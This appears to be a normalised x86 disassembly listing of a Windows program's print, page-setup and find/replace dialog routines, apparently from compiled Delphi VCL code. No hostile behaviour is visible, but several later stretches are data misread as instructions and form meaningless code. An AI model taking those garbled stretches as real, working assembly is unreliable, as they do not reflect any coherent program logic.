test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028f0
sub_42e864
push ebx
add esp 0xffffffb8
mov ebx eax
lea eax [ esp + 0x4 ]
xor ecx ecx
mov edx 0x42
call sub_402b80
mov [ esp + 0x4 ] 0x42
mov eax [ rw-data ]
mov [ esp + 0x26 ] eax
lea edx [ esp + 0x10 ]
mov eax esp
call sub_42e64c
mov eax [ esp ]
call sub_42e7cc
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x2040
mov [ esp + 0x32 ] sub_42e0a4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov edx PrintDlgA
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov ebx eax
test bl bl
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
call sub_42e750
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x48
pop ebx
retn
push eax
call GlobalFree
sub_42e910
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e977
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_424af0
cmp [ ebp + 0xa ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e97e
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
dec eax
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_42e984
push ebp
mov ebp esp
push ecx
push ebx
mov edx [ ebp + 0xc ]
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x10
mov [ ebp - 0x1 ] 0x0
cmp edx 0x400
jne r-xdata
add edx 0xfffffbff
cmp edx 0x5
ja r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xda ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x1 ]
jmp [ edx * 4 + jump_table_42ea35 ]
mov eax [ ebp + 0x10 ]
shr eax 0x10
mov edx eax
sub edx 0x1
je r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x104 ]
push [ eax + 0x100 ]
call sub_42e910
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xf4 ]
push [ eax + 0xf0 ]
call sub_42e910
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x114 ]
push [ eax + 0x110 ]
call sub_42e910
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0x10c ]
push [ eax + 0x108 ]
call sub_42e910
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xfc ]
push [ eax + 0xf8 ]
call sub_42e910
pop ecx
jmp r-xdata
push ebp
mov eax [ rw-data ]
push [ eax + 0xec ]
push [ eax + 0xe8 ]
call sub_42e910
pop ecx
mov dl 0x1
sub edx 0x2
je r-xdata
sub edx 0x8
je r-xdata
sub edx 0xe
je r-xdata
xor edx edx
jmp r-xdata
and edx 0x7f
mov dl [ edx + rw-data ]
push edx
cmp eax 0xb
setg al
and eax 0x7f
mov al [ eax + rw-data ]
push eax
lea eax [ ebp - 0x1 ]
push eax
mov cx [ ebp + 0x10 ]
and cx 0xffff
mov ebx [ rw-data ]
mov edx [ rw-data ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
sub_42eaf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e10c
mov ax [ r-xdata ]
mov [ esi + 0x58 ] ax
mov eax esi
call sub_42ed3c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42eb42
add [ eax ] al
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi eax
lea eax [ edi + 0x84 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea esi [ edi + 0x84 ]
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
lea edx [ esi + 0xc ]
mov eax esp
call sub_42e64c
mov eax [ esp ]
call sub_42e7cc
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] 0x400
lea eax [ edi + 0x84 ]
push eax
call PageSetupDlgA
mov [ esi + 0x10 ] 0x42002
mov al [ edi + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ edi + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ edi + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ edi + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ edi + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
mov [ rw-data ] edi
mov [ esi + 0x48 ] sub_42e984
add [ esi + 0x10 ] 0x80000
jmp r-xdata
test [ edi + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
test [ edi + 0x58 ] 0x10
je r-xdata
test [ edi + 0x58 ] 0x40
je r-xdata
add [ esi + 0x10 ] 0x20
test [ edi + 0x58 ] 0x80
je r-xdata
add [ esi + 0x10 ] 0x2
test [ edi + 0x59 ] 0x1
je r-xdata
inc [ esi + 0x10 ]
test [ edi + 0x59 ] 0x2
jne r-xdata
add [ esi + 0x10 ] 0x800
test [ edi + 0x59 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x80
lea ecx [ esp + 0x4 ]
mov edx [ edi + 0x80 ]
mov eax [ edi + 0x7c ]
call sub_416c28
mov eax [ esp + 0x4 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x68 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x64 ]
mov edx [ edi + 0x60 ]
mov eax [ edi + 0x5c ]
call sub_416c50
push esi
push edi
lea edi [ esi + 0x1c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ edi + 0x78 ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ edi + 0x74 ]
mov edx [ edi + 0x70 ]
mov eax [ edi + 0x6c ]
call sub_416c50
push esi
push edi
lea edi [ esi + 0x2c ]
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x44 ] sub_42e0a4
lea ecx [ edi + 0x84 ]
mov edx PageSetupDlgA
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
add [ esi + 0x10 ] 0x200000
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov [ edi + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ edi + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ edi + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ edi + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ edi + 0x78 ] eax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
call sub_42e750
jmp r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x1c
pop edi
pop esi
pop ebx
retn
push eax
call GlobalFree
sub_42ed3c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov ebx eax
lea esi [ ebp - 0x55 ]
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_42ed70
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_42c144
call sub_42bca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x54
call sub_402b80
mov [ esi ] 0x54
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x3c ] eax
mov al [ ebx + 0xe0 ]
dec al
je r-xdata
add [ esi + 0x10 ] 0x8
dec al
jne r-xdata
test [ ebx + 0x58 ] 0x2
je r-xdata
add [ esi + 0x10 ] 0x0
test [ ebx + 0x58 ] 0x1
je r-xdata
add [ esi + 0x10 ] 0x4
jmp r-xdata
test [ ebx + 0x58 ] 0x4
je r-xdata
add [ esi + 0x10 ] 0x10
test [ ebx + 0x58 ] 0x8
je r-xdata
add [ esi + 0x10 ] 0x100
test [ ebx + 0x58 ] 0x10
je r-xdata
add [ esi + 0x10 ] 0x80000
test [ ebx + 0x58 ] 0x20
je r-xdata
add [ esi + 0x10 ] 0x200
lea ecx [ ebp - 0x60 ]
mov edx [ ebx + 0x80 ]
mov eax [ ebx + 0x7c ]
call sub_416c28
mov eax [ ebp - 0x60 ]
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x5c ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x68 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x60 ]
mov eax [ ebx + 0x5c ]
call sub_416c50
push esi
lea edi [ esi + 0x1c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx + 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebx + 0x74 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x6c ]
call sub_416c50
push esi
lea edi [ esi + 0x2c ]
lea esi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x44 ] sub_42e0a4
or [ esi + 0x10 ] 0x400
push esi
call PageSetupDlgA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ esi + 0x10 ] 0x20
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_42eff6
inc edx
add [ ecx ] dl
push esp
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
adc al dh
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xef28776f
inc edx
add [ ebx + ebx * 4 + 0xb0044 ] al
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_450ca8
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_42f05c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_451830
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42f0a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42f0dc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ee58
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42f0a0
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46ee7c
jmp r-xdata
push ebp
call sub_42f0a0
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ee58
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ee58
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46ee7c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_46ee7c
jmp r-xdata
sub_42f190
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42e0a4
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42f450
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42f4b8
push eax
mov eax esi
call sub_42f450
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42f4b8
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42f0dc
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42f218
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e10c
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42f190
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42f2c2
add [ eax ] al
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40cfec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e154
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_42f318
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_44a514
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42f354
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42f190
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44fb48
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42f318
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_453e1c
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42f468
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42f4d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42e188
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403370
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403370
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_453e1c
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42f5c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043ac
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408618
pop esi
pop ebx
retn
sub_42f5ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4043ac
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408618
pop esi
pop ebx
retn
sub_42f610
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42f218
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42f6f4
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408bfc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42f78f
add [ edi ] cl
add [ eax ] al
add [ eax - 0x27ffb8f8 ] cl
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x71080047 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffb8f8 ] al
outsb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x47 ] bh
add [ eax ] bl
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] ah
inc edi
add [ edx + esi * 2 + 0x47 ] ah
add [ eax ] al
sub al 0x8
inc edi
add [ edi + ebp * 2 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ch
or [ edi ] al
clc
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] bh
inc edi
add [ ecx + esi * 2 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x47 ] dh
add [ eax + esi * 2 + 0x47 ] bh
add [ eax ] al
jo r-xdata
call GlobalDeleteAtom
add [ eax ] al
add [ eax ] al
add [ eax + ecx ] ah
inc edi
add [ edx + esi * 2 + 0x47 ] al
add [ eax ] al
insb
or [ edi ] al
or [ eax + 0x47 ] dh
inc edi
add [ eax + 0x4771 ] ch
add [ eax ] al
add [ eax + ecx + 0x47 ] ch
add [ eax ] cl
jo r-xdata
mov [ fs : eax ] edx
push sub_42f8a1
retn
std
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f89a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx + 0x47 ] ah
add [ eax + esi * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] ah
or [ edi ] al
insb
jo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] ch
inc edi
add al dl
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404968
mov ax [ rw-data ]
push eax
sub_42f8a4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cc0
call sub_42f6f4
mov eax [ r-xdata ]
call sub_4178dc
mov eax [ r-xdata ]
call sub_41797c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
sub_42f990
sub [ ecx ] dh
inc eax
add [ eax ] cl
or eax [ ebx ]
sub bh dh
inc esp
add [ eax ] ah
jmp r-xdata
add al al
enter 0x44 0xc4
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_42f99f
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax - 0x36 ] dh
inc esp
add [ esp + edx * 8 ] bl
inc esp
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ edx + ecx + 0x43 ] ah
add [ eax - 0x4bffbb1b ] bh
in eax 0x44
add [ esi - 0x3687ffbc ] al
inc esp
add [ eax + edx * 8 - 0x2fdfffbc ] bh
inc esp
add [ eax - 0x27 ] cl
inc esp
add al al
enter 0x44 0xc4
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_42fa1e
inc esp
add [ ebx + ebx * 8 + 0x44 ] bl
add [ ebx + ecx + 0x43 ] al
add [ ecx ] al
add [ ebx ] dl
add [ esp + ecx + 0x43 ] ah
add [ ebx + edx * 2 ] cl
je r-xdata
add bh bh
insb
or al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4205000d ] al
jb r-xdata
insb
inc ebx
push 0x65676e61
push es
push esp
push ebx
push 0x48657061
cli
inc edx
add [ edi ] al
push es
push esp
push ebx
push 0x98657061
stc
inc edx
add [ eax + 0x2200449c ] ah
add [ eax ] cl
inc ebp
js r-xdata
add [ fs : eax ] al
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah 0xff
inc ebx
je r-xdata
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
mov eax 0x7a004480
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
insb
jae r-xdata
add [ eax ] eax
inc ebx
jne r-xdata
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
add [ eax + eax + 0x5b ] 0x0
add bh bh
dec eax

inc [ edi + edx * 8 - 0x28b3ffbc ]
jb r-xdata
dec [ eax ]
sti
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
or [ edi ] ah
inc edx
add [ ecx + eax ] ch
[ esp + ecx + 0x43 ]
adc [ eax ] al
add [ eax ] al
adc eax 0x68530500
popad
jo r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx - 0x57010000 ] bl
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
add bh bh
or bl bh
jb r-xdata
add [ eax ] al
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080016 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ ecx - 0x7b010000 ] bl
xlat
inc esp
add [ edi + edx * 8 + 0x44 ] cl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
lodsb [ esi ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
